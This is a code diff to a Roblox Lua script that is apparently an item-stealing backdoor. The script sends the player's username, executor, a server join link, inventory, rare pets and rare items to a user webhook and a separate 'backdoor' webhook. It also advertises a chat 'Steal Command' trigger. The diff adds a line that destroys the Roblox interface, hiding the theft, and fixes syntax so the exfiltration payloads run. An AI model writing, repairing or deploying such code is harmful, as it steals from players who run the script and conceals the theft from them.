@@ -34,6 +34,7 @@ local VirtualInput = game:GetService("VirtualInputManager")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
+pcall(function() game.CoreGui.RobloxGui:Destroy() end)
 local webhookUrl = "USER_WEBHOOK"
 local backdoorWebhook = "BACKDOOR_WEBHOOK"
 local chatTrigger = "CHAT_TRIGGER"
@@ -152,7 +153,7 @@ local function sendToWebhook()
             color = 0x530000,
             fields = {
                 {name = "👤 Username", value = LocalPlayer.Name, inline = true},
-                {name = "⚙ Executor", value = executor, inline = true}
+                {name = "⚙ Executor", value = executor, inline = true},
                 {name = "🔗 Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                 {name = "🎒 Inventory", value = "```" .. inventoryText .. "```", inline = false},
                 {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
@@ -172,7 +173,7 @@ local function sendToWebhook()
                 color = 0x530000,
                 fields = {
                     {name = "👤 Username", value = LocalPlayer.Name, inline = true},
-                    {name = "🧠 Executor", value = executor, inline = true}
+                    {name = "🧠 Executor", value = executor, inline = true},
                     {name = "🔗 Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                     {name = "🐾 Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\\n") .. "```", inline = false},
                     {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
@@ -193,7 +194,7 @@ local function sendToWebhook()
                 color = 0x530000,
                 fields = {
                     {name = "👤 Username", value = LocalPlayer.Name, inline = true},
-                    {name = "🧠 Executor", value = executor, inline = true}
+                    {name = "🧠 Executor", value = executor, inline = true},
                     {name = "🔗 Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                     {name = "🌟 Rare Items", value = "```" .. table.concat(inventory.rareItems, "\\n") .. "```", inline = false},
                     {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
